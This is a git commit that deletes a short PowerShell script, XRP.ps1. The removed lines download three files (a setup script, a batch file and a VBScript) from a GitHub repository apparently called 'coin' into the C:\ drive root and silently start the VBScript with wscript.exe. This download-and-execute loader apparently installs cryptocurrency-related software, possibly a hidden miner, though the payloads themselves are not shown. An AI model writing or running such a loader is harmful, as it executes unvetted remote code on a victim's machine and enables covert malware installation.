e788d050d9c33749e12adfe7b9fdb481c271616c
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-01-10 13:53:39 +0700

    Delete XRP.ps1

--- XRP.ps1
+++
@@ -1,5 +0,0 @@
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRPSETUP.ps1' -OutFile 'C:\XRPSETUP.ps1'
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/RUNSYS_XRP.bat' -OutFile 'C:\RUNSYS_XRP.bat'
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/RUNSYS_XRP.vbs' -OutFile 'C:\RUNSYS_XRP.vbs'
-Start-Process -FilePath 'wscript.exe' -ArgumentList 'C:\RUNSYS_XRP.vbs'
-exit
